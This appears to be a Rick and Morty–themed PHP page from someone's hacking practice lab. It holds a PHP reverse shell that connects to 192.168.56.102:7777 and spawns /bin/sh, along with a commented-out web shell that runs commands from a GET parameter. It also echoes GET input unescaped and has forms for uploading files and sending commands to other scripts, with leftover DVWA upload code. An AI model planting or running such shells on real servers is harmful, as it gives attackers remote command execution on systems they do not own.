<h2>RIIICK</h2>

<?php
$var = 'C137';

echo "<h4>RICK ".$var."</h4>"; 

# Does not work atm
$sock=fsockopen("192.168.56.102",7777);
exec("/bin/sh -i <&3 >&3 2>&3");

#echo shell_exec($_GET['e'].' 2>&1');
echo "<p>GET value: ".$_GET['test']."</p>";

#phpinfo();
?>
<!-- The data encoding type, enctype, MUST be specified as below -->
<form enctype="multipart/form-data" action="Summer.php" method="POST">
    <!-- MAX_FILE_SIZE must precede the file input field -->
    <!-- Name of input element determines name in $_FILES array -->
    <input name="uploaded_file" type="file" value="Seeek" /><br><br>
    <input type="submit" name="Upload" value="Upload to Summer">
</form>

</form>


<form action="Morty.php" method="post"><br>
    <p>What should Morty do?</p>
    <input type="text" name="command"/><br><br>
    <input type="submit" name="submit" value="Submit" />
<!--
    <label for="transfer">Transfer</label><br>
    <input type="text" name="transfer" id="transfer" maxlength="40"><br><br>

    <button type="reset">Eingaben zurücksetzen</button><br><br>
    <button type="submit">Eingaben absenden</button><br>
-->
</form>


<?php

if( isset( $_POST[ 'Upload' ] ) ) {
    echo 'hello world';
}
#if( isset( $_POST[ 'Upload' ] ) ) {
#    // Where are we going to be writing to?
#    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";
#    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );
#
#    // Can we move the file to the upload folder?
#    if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {
#        // No
#        echo '<pre>Your image was not uploaded.</pre>';
#    }
#    else {
#        // Yes!
#        echo "<pre>{$target_path} succesfully uploaded!</pre>";
#    }
#}
?>
